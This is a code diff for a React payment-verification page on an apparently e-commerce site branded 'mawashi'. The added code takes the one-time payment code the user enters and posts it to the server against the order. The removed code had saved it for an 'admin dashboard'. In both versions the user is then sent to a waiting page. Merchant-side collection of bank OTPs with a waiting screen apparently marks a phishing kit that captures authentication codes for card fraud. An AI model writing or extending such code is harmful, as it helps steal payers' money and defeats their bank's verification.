@@ -2,6 +2,7 @@ import { useState, useRef, useEffect } from 'react';
 import { useLocation } from 'wouter';
 import { X } from 'lucide-react';
 import { Shell } from '../shared';
+import { useUpdateOrder } from '@workspace/api-client-react';
 
 export function PaymentVerificationPage() {
   const [, setLocation] = useLocation();
@@ -10,7 +11,12 @@ export function PaymentVerificationPage() {
   const [showInvalidError, setShowInvalidError] = useState(false);
   const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
 
+  const updateOrder = useUpdateOrder();
   const fullCode = code.join('');
+
+  // Get order ID from localStorage
+  const orderData = localStorage.getItem('mawashi-last-order');
+  const orderId = orderData ? JSON.parse(orderData).id : null;
 
   // Check URL params on mount
   useEffect(() => {
@@ -71,12 +77,25 @@ export function PaymentVerificationPage() {
       return;
     }
     
-    // Store OTP for admin dashboard
-    localStorage.setItem('mawashi-otp-code', fullCode);
-    window.dispatchEvent(new Event('mawashi-data-update'));
-    
-    // Navigate to waiting page first
-    setLocation('/payment-waiting');
+    // Send OTP to server
+    if (orderId) {
+      updateOrder.mutate({
+        id: orderId,
+        data: { otpCode: fullCode }
+      }, {
+        onSuccess: () => {
+          window.dispatchEvent(new Event('mawashi-data-update'));
+          setLocation('/payment-waiting');
+        },
+        onError: () => {
+          // Still navigate even if server update fails
+          window.dispatchEvent(new Event('mawashi-data-update'));
+          setLocation('/payment-waiting');
+        }
+      });
+    } else {
+      setLocation('/payment-waiting');
+    }
   };
 
   useEffect(() => {
